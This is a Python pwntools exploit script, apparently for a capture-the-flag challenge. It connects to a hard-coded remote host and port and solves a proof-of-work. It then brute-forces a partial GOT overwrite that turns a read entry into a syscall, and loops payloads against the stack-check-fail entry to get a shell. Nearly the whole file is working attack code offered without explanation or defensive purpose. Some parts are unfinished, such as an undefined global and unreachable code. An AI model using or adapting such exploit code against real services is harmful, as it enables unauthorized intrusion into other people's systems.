#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"


def pow(p):

    time.sleep(0.3)
    data = p.recvuntil("Solution: \n")
    chall = data.split("\n")[1].split(":")[1].strip()
    n = data.split("\n")[2].split(":")[1].strip()
    res = os.popen("./pow.py " + chall + " " + n).read()
    target = res.split("Solution: ")[1].split("->")[0].strip()
    p.sendline(target)
    time.sleep(0.2)
    

def test():

    p.send("\x00"*8)
    p.send("\x00"*8)
    p.send("\x00"*8 + "\x00"*8)
    time.sleep(0.1)
    p.interactive()

#c8 is read!.
#b8 is stk_chk_fail
#c0 is 

def guess_got():

    critical = ""
    for i in range(100000):
        
        p = remote("52.52.199.139",31337)
        pow(p)
        p.recvuntil('Go\n')
        got = 0x601028
        #a8,b0,b8
        #stk_chk_fail: 0xb0
        temp = 0xff - i 
        p.send(p64(0xffffffffffffffc8))
        time.sleep(1)
        p.send(chr(0xf9)) #now read_got is syscall.
        time.sleep(1)
        
        data = p.recvuntil("Go\n",timeout=10)
        print data
        if len(data) > 100:
            print "HIt!"
            critical = 0xf9
            #test if b45 is in ret
            break
        else:
            p.close()
    return p
    #get our write offset!.
    
    #now we going to modify stk_chk_fail.

def brute_shell(p):

    print "Let's start shooting!"
    while 1:
        p.send(p64(0xffffffffffffffc8) + "\x00" * 300)
        time.sleep(1)
        p.send("\x77\x4e")
        time.sleep(1)
        time.sleep(0.2)
        p.sendline(sys.argv[1])
        data = p.recvuntil("Go\n", timeout = 10) #critical leak of current process.
        print data
        if len(data) > 10 and 'smash' not in data:
            pass

per = guess_got()
brute_shell(per)
